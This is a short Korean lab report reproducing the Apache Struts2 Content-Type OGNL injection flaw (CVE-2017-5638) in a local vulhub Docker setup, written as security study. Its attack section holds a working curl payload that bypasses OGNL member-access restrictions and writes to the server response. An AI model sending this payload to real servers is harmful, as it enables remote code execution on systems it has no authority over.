CVE-2017-5638 (Apache Struts2 RCE) 실습 보고서

1. 개요
Apache Struts2의 Content-Type 필드 처리 취약점을 악용하여 원격 코드 실행(RCE)을 수행하는 취약점을 도커 환경에서 재현하였다.

2. 실습 환경
- Host OS: Windows 11
- Docker Version: 28.0.4
- Docker Compose Version: 2.34.0

3. 환경 구축 과정
3.1. 레포 클론 및 폴더 이동
git clone https://github.com/vulhub/vulhub.git
cd vulhub/struts2/s2-045

3.2. 컨테이너 실행
docker compose up -d
(여기에 [컨테이너 띄운 캡처] 이미지를 삽입할 예정)

4. 취약점 공격 (PoC)
4.1. 공격 명령어
curl -v -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ctn=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#ctn.getWriter().println('vulnerable')).(#ctn.getWriter().flush())}" http://localhost:8080/struts2-showcase/upload.action

4.2. 공격 결과
vulnerable 출력 확인 
(여기에 curl 공격 성공 캡처 이미지 넣을 예정)

5. 결론
Apache Struts2의 Content-Type 필드 OGNL Injection 취약점을 통해 외부 입력값을 서버에서 코드로 실행할 수 있는 치명적인 보안 이슈를 실습을 통해 검증하였다.

6. 참고 자료
https://vulhub.org/#/environments/struts2/s2-045/
https://nvd.nist.gov/vuln/detail/CVE-2017-5638